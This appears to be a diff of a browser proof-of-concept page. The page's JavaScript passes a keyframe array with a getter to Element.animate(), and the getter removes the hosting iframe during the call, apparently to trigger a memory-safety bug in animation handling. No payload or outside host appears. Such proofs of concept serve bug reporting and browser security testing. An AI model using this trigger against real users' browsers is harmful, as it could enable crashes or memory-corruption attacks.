@@ -3,32 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Animation Vulnerability PoC</title>
+    <title>PoC Complex Animation Vulnerability</title>
 </head>
 <body>
-    <h1>PoC for Animation Vulnerability</h1>
+    <h1>PoC for Complex Animation Vulnerability</h1>
     <script>
-        function allociframe(){
+        // Function to dynamically allocate an iframe
+        function allociframe() {
             var iframe = document.createElement("iframe");
             console.log(iframe);
             iframe.height = 0;
             iframe.width = 0;
-            // document.body.appendChild( iframe ); // Uncomment for full iframe rendering
+            document.body.appendChild(iframe); // Append iframe to the body
             return iframe;
         }
 
-        iframe = allociframe();
-        c = iframe.contentDocument.createElement("div");
+        // Function to trigger animation and simulate vulnerability
+        function triggerAnimation() {
+            var iframe = allociframe();
+            var c = iframe.contentDocument.createElement("div");
 
-        var arr = [];
-        arr.__defineGetter__(0, () => {
-            console.log("getter called");
-            document.body.removeChild(iframe); // Simulate cleanup or context destruction
-            return { transform: 'translate3D(0, -300px, 0)' }; // Animation property
-        });
+            var arr = [];
+            
+            // Define getter to simulate vulnerability
+            arr.__defineGetter__(0, () => {
+                console.log("getter triggered");
+                document.body.removeChild(iframe); // Simulate cleanup (remove iframe from DOM)
+                
+                // Return a transform property to simulate animation
+                return { transform: 'translate3D(0, -300px, 0)' };
+            });
 
-        c.animate(arr, { duration: 3000, iterations: Infinity, timeline: null });
+            // Chain of animations with extended properties
+            c.animate(arr, {
+                duration: 3000,
+                iterations: Infinity,
+                timeline: null
+            });
 
+            console.log("Animation triggered, waiting for getter...");
+            return c;
+        }
+
+        // Function to chain further operations
+        function chainOperations() {
+            var elem = triggerAnimation(); // Initial animation trigger
+            
+            // Add additional steps in the chain for complexity
+            setTimeout(() => {
+                console.log("Performing next operation after animation...");
+                
+                // Add further manipulation here, for instance changing styles or adding new animations
+                elem.style.backgroundColor = "red";  // Example: Change background color after animation
+                console.log("Changed background color");
+            }, 1500); // Delay to simulate async behavior
+
+            // Final operation in the chain
+            setTimeout(() => {
+                console.log("Finalizing chain...");
+                elem.style.transform = 'translate3D(0, 300px, 0)';  // Change transform property
+            }, 3000);
+        }
+
+        // Start the chain of operations
+        chainOperations();
     </script>
 </body>
 </html>
